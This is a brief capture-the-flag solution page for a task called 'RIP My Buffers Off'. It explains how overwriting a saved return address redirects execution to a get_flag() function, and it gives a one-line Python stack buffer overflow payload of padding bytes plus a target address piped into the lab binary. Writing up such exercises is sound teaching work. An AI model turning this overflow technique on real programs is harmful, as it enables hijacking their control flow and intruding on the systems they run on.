---
nav_order: 1
parent: 'Task: RIP My Buffers Off'
---

# Solution

The function address on the stack needs to be overwritten with the address of `get_flag()`.
Before reaching that, the payload needs to pass through some local variables and the EBP.

```sh
python3 -c 'import sys; sys.stdout.buffer.write(b"A"*41 + b"\xed\x85\x04\x08")' | ./buff-ovf2
```
